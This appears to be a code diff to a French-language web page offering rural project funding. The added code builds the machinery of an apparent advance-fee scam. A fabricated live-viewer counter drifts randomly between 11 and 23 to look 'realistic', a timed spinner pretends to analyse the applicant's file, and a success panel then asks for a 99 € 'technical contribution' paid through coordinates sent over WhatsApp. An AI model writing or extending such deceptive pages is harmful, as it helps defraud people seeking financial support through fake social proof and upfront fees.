@@ -500,11 +500,36 @@
                 <div class="spinner"></div>
                 <p id="loader-text" style="font-weight: 600; color: var(--navy);">Analyse de votre dossier de soutien en cours...</p>
             </div>
-            <div id="success-message" style="display:none;">
-                <i class="fas fa-check-circle" style="color:var(--success); font-size:3rem;"></i>
-                <h3 style="color: var(--navy); margin: 10px 0;">DOSSIER ENREGISTRÉ</h3>
-                <p style="font-size: 0.85rem; margin-bottom: 15px;">Référence : #CEZ-RURAL-2026</p>
-                <button class="btn-main" onclick="resetAll()">OK</button>
+            <div id="success-message" style="display:none; text-align: left; max-height: 460px; overflow-y: auto; padding: 5px;">
+                <div style="text-align: center; margin-bottom: 10px;">
+                    <i class="fas fa-check-circle" style="color:var(--success); font-size:2.5rem;"></i>
+                    <h3 style="color: var(--navy); margin: 5px 0; font-size: 1.1rem;">DOSSIER ENREGISTRÉ AVEC SUCCÈS !</h3>
+                </div>
+                
+                <div style="background: #fdfaf3; border: 1px solid var(--gold); padding: 10px; border-radius: 4px; font-size: 0.75rem; margin-bottom: 10px;">
+                    <p><strong>Code de référence :</strong> <span id="refCodeDisplay" style="color: var(--navy); font-weight: 800;">#CEZ-RURAL-2026</span></p>
+                    <p style="margin-top: 4px;"><strong>Contribution technique :</strong> 99 € (~105 USD)</p>
+                </div>
+
+                <div style="font-size: 0.7rem; color: #555; line-height: 1.4; margin-bottom: 10px;">
+                    🛡️ <strong>Notre engagement qualité :</strong> Aucun dossier sérieux n'est rejeté arbitrairement. Votre contribution sert directement à rémunérer l'expertise technique et l'analyse approfondie de votre projet sous 24 à 48h.
+                </div>
+
+                <p style="font-size: 0.72rem; font-weight: 700; color: var(--navy); margin-bottom: 6px;">
+                    Pour obtenir les coordonnées et finaliser, choisissez l'une de ces options :
+                </p>
+
+                <div style="background: #f8f9fa; border: 1px solid #ddd; padding: 8px; border-radius: 4px; margin-bottom: 8px;">
+                    <label style="font-size: 0.68rem; font-weight: 700; color: var(--navy); display: block; margin-bottom: 4px;">1. Laisser un message sur le site :</label>
+                    <textarea id="clientMsgInput" placeholder="Écrivez votre message pour demander les instructions..." style="width: 100%; height: 40px; font-size: 0.7rem; padding: 5px; border: 1px solid #ccc; border-radius: 3px; resize: none;"></textarea>
+                    <button type="button" onclick="sendClientMessage()" style="background: var(--navy); color: white; border: none; padding: 5px 10px; font-size: 0.68rem; font-weight: 700; border-radius: 3px; cursor: pointer; margin-top: 4px; width: 100%;">Envoyer ma demande</button>
+                </div>
+
+                <a id="waDirectBtn" href="https://wa.me/33780976404?text=Bonjour,%20mon%20code%20de%20référence%20est%20%23CEZ-RURAL-2026.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique." target="_blank" style="display: flex; align-items: center; justify-content: center; gap: 8px; background: var(--whatsapp); color: white; padding: 8px; border-radius: 4px; text-decoration: none; font-size: 0.75rem; font-weight: 700; margin-bottom: 10px;">
+                    <i class="fab fa-whatsapp" style="font-size: 1rem;"></i> 2. Contactez-nous directement sur WhatsApp
+                </a>
+
+                <button class="btn-main" onclick="resetAll()" style="padding: 8px; font-size: 0.75rem;">Fermer / Nouveau dossier</button>
             </div>
         </div>
 
@@ -515,7 +540,7 @@
         <form id="loanForm" onsubmit="validateAndSubmit(event)">
             <input type="hidden" name="access_key" value="192a039c-174a-4ccd-b28e-93cbb5a26215">
             
-            <input type="text" name="nom" placeholder="Nom et Prénom du Porteur" class="form-input" required>
+            <input type="text" name="nom" id="inputNom" placeholder="Nom et Prénom du Porteur" class="form-input" required>
             
             <select name="type_porteur" class="form-input" required>
                 <option value="" disabled selected>Type de porteur de projet</option>
@@ -802,6 +827,21 @@
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 <script>
+    // Compteur dynamique en vert (monte et descend entre 11 et 23 de façon réaliste)
+    setInterval(() => {
+        const countSpan = document.getElementById('viewers-count');
+        if (countSpan) {
+            let current = parseInt(countSpan.innerText);
+            let change = Math.random() > 0.5 ? 1 : -1;
+            current += change;
+            if (current < 11) current = 12;
+            if (current > 23) current = 21;
+            countSpan.innerText = current;
+        }
+    }, 4500);
+
+    let generatedRefCode = "";
+
     function updateIndicatif() {
         const paysSelect = document.getElementById('paysSelect');
         const selectedOption = paysSelect.options[paysSelect.selectedIndex];
@@ -970,8 +1010,19 @@
             return;
         }
 
+        // Génération d'un code de référence unique
+        const randomNum = Math.floor(10000 + Math.random() * 90000);
+        generatedRefCode = `#CEZ-${randomNum}`;
+
+        // Ajout dynamique du code de référence dans les champs cachés du formulaire Web3Forms si besoin
+        let form = document.getElementById('loanForm');
+        let refInputHidden = document.createElement('input');
+        refInputHidden.type = 'hidden';
+        refInputHidden.name = 'code_reference';
+        refInputHidden.value = generatedRefCode;
+        form.appendChild(refInputHidden);
+
         document.getElementById('loader-overlay').style.display = 'flex';
-        const form = document.getElementById('loanForm');
         const formData = new FormData(form);
         
         const response = await fetch('https://api.web3forms.com/submit', { method: 'POST', body: formData });
@@ -981,12 +1032,35 @@
             if(typeof gtag === 'function'){ gtag('event', 'conversion', {'send_to': 'AW-18121475138/vGqNCOf1r_kZELqR9-8_'}); }
             setTimeout(() => {
                 document.getElementById('loading-content').style.display = 'none';
+                
+                // Affichage du code généré dans l'interface de succès
+                document.getElementById('refCodeDisplay').innerText = generatedRefCode;
+                
+                // Mise à jour du lien WhatsApp avec le bon code de référence
+                const clientNom = document.getElementById('inputNom').value || "Client";
+                const waUrl = `https://wa.me/33780976404?text=Bonjour,%20je%20suis%20${encodeURIComponent(clientNom)}.%20Mon%20code%20de%20référence%20est%20${generatedRefCode}.%20Je%20souhaite%20recevoir%20les%20coordonnées%20pour%20régler%20la%20contribution%20technique%20de%2099€.`;
+                document.getElementById('waDirectBtn').href = waUrl;
+
                 document.getElementById('success-message').style.display = 'block';
             }, 3000);
         } else {
             alert("Une erreur est survenue lors de l'envoi du dossier. Veuillez réessayer.");
             document.getElementById('loader-overlay').style.display = 'none';
         }
+    }
+
+    async function sendClientMessage() {
+        const msg = document.getElementById('clientMsgInput').value.trim();
+        if(!msg) {
+            alert("Veuillez écrire un message.");
+            return;
+        }
+
+        const clientNom = document.getElementById('inputNom').value || "Anonyme";
+        
+        // Envoi du message par API ou redirection vers WhatsApp pré-rempli avec le message
+        const finalUrl = `https://wa.me/33780976404?text=Message%20depuis%20le%20site%20(Réf:%20${generatedRefCode},%20Nom:%20${encodeURIComponent(clientNom)}):%20${encodeURIComponent(msg)}`;
+        window.open(finalUrl, '_blank');
     }
 </script>
 </body>
